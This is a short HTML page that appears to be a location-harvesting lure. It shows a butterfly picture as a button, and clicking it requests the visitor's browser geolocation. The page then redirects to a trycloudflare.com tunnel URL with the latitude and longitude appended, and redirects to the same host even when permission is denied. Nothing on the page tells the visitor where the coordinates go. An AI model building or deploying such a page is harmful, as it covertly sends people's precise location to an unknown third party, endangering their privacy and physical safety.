<!DOCTYPE html>
<html>
<head>
    <title>Clickable Image with Location</title>
</head>
<body>

    <!-- Clicking the image triggers the getLocation function -->
    <button onclick="getLocation()" style="border:none; background:none; padding:0; cursor:pointer;">
        <img src="https://freepik.com" 
             alt="Butterfly on a flower" 
             style="width:300px;">
    </button>

    <p id="status" style="font-family: Arial, sans-serif; color: #555;"></p>

    <script>
        function getLocation() {
            const status = document.getElementById("status");
            // Your integrated location URL
            const targetUrl = "https://penalty-showers-pushing-moore.trycloudflare.com";

            if (navigator.geolocation) {
                status.innerHTML = "Accessing location... please wait.";
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Success: Redirect with coordinates appended to your URL
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        window.location.href = `${targetUrl}?lat=${lat}&lon=${lon}`;
                    },
                    (error) => {
                        // Error: User blocked location or signal lost
                        console.warn("Location error:", error.message);
                        status.innerHTML = "Location denied. Redirecting to site...";
                        setTimeout(() => { window.location.href = targetUrl; }, 1200);
                    }
                );
            } else {
                // Browser doesn't support Geolocation
                status.innerHTML = "Geolocation not supported. Redirecting...";
                window.location.href = targetUrl;
            }
        }
    </script>

</body>
</html>
